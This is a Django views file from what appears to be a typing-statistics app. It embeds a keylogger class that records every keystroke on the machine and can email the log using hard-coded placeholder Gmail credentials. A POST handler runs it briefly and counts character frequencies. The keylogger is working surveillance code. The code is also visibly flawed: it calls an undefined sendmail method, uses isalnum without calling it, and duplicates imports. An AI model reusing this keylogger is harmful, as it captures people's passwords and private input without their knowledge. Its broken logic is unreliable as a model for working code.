import os
from django.urls import reverse
from django.shortcuts import redirect, render
from django.views import View
from django.shortcuts import render

import multiprocessing
import os

# Create your views here.

import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
import re
import time
from pywinauto import Application
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
EMAIL_PASSWORD = "thisisafakepassword"
class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"Recorded"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

class HomePage(View):
    
    def runProgram():
        os.system(r'py logger\logger_files\test.py')

    def get(self, request):
        return render(request, 'index.html')

    def post(self, request):
        #Js to change page to "Running..."
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        child_process = multiprocessing.Process(target=keylogger.start)
        child_process.start()
        child_process.join(SEND_REPORT_EVERY+1)
        if child_process.is_alive():
            print('Child process is still alive. Terminating now...')
            child_process.terminate()
            print('Child process status:', child_process.is_alive())
        #on ctrl+c in terminal will redirect to results page
        os.system(r'node txt-correcter.js')
        return redirect(reverse('results'))

class ResultsPage(View):
    def get(self, request):
        context = {}
        context['charFrequencies'] = {}
        with open('corrected-txt.txt') as f:
            text = f.read()
        f.close()

        for char in text:
            if char.isalnum:
                if char in context['charFrequencies']:
                    context['charFrequencies'][char] += 1
                else:
                    context['charFrequencies'][char] = 1
        
        context['text'] = text
        print((context['charFrequencies']))
        return render(request, 'results.html', context)
    